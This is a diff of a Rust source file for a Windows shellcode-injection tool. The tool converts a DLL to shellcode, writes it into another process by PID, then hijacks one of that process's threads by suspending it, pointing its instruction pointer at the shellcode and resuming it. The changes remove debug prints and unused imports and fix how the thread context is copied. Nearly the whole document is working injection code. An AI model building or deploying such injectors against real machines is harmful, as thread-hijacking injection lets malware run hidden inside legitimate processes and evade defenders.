@@ -1,24 +1,19 @@
 use std::{
-    error::Error,
-    fs::File,
-    mem::MaybeUninit,
     os::raw::c_void,
     path::{Path, PathBuf},
     process::Command,
     ptr::null_mut,
-    str::FromStr,
 };
 
 use anyhow::{anyhow, ensure, Context};
 use clap::Parser;
 use windows::Win32::{
-    Foundation::{CloseHandle, GetLastError, ERROR_INSUFFICIENT_BUFFER, HANDLE, MAX_PATH},
-    Storage::FileSystem::GetTempFileNameA,
+    Foundation::{CloseHandle, GetLastError, ERROR_INSUFFICIENT_BUFFER, HANDLE},
     System::{
         Diagnostics::{
             Debug::{
                 GetThreadContext, InitializeContext, SetThreadContext, WriteProcessMemory, CONTEXT,
-                CONTEXT_CONTROL_X86, CONTEXT_FLAGS, CONTEXT_FULL_X86,
+                CONTEXT_FLAGS, CONTEXT_FULL_X86,
             },
             ToolHelp::{
                 CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD,
@@ -60,7 +55,6 @@ fn main() -> anyhow::Result<()> {
     let shellcode = dll_to_shellcode(&cli.dll_path, &dll_to_shellcode_path)
         .context("failed to convert dll to shellcode")?;
     run_remote_shellcode(cli.pid, &shellcode).context("failed to run shellcode")?;
-    println!("DEBUG:back in ain");
     Ok(())
 }
 
@@ -87,7 +81,6 @@ fn run_remote_shellcode(pid: u32, shellcode: &[u8]) -> anyhow::Result<()> {
     println!("[*] injecting to thread with TID {}", tid);
     let shellcode_addr = allocate_shellcode_in_remote_process(pid, shellcode)?;
     run_shellcode_in_remote_thread(tid, shellcode_addr)?;
-    println!("DEBUG: done2");
     Ok(())
 }
 
@@ -140,14 +133,14 @@ fn run_shellcode_in_remote_thread(tid: u32, shellcode_addr: *mut c_void) -> anyh
         return Err(windows::core::Error::from_win32()).context("failed to suspend thread");
     }
 
-    let (_orig_ctx_buf, orig_ctx_ptr) = initialize_context(CONTEXT_FULL_X86)?;
+    let (orig_ctx_buf, orig_ctx_ptr) = initialize_context(CONTEXT_FULL_X86)?;
     let orig_ctx = unsafe { &mut *orig_ctx_ptr };
     orig_ctx.ContextFlags = CONTEXT_FULL_X86;
     unsafe { GetThreadContext(thread_handle.0, orig_ctx).context("failed to get thread context")? };
 
-    let (_shellcode_ctx_buf, shellcode_ctx_ptr) = initialize_context(CONTEXT_FULL_X86)?;
+    let (mut shellcode_ctx_buf, shellcode_ctx_ptr) = initialize_context(CONTEXT_FULL_X86)?;
+    shellcode_ctx_buf.copy_from_slice(&orig_ctx_buf);
     let shellcode_ctx = unsafe { &mut *shellcode_ctx_ptr };
-    *shellcode_ctx = *orig_ctx;
     shellcode_ctx.ContextFlags = CONTEXT_FULL_X86;
     shellcode_ctx.Rip = shellcode_addr as u64;
     println!("[*] setting rip to 0x{:x}", shellcode_addr as u64);
@@ -160,7 +153,6 @@ fn run_shellcode_in_remote_thread(tid: u32, shellcode_addr: *mut c_void) -> anyh
     if res == u32::MAX {
         return Err(windows::core::Error::from_win32()).context("failed to resume thread");
     }
-    println!("DEBUG: done running shellcode");
     Ok(())
 }
 
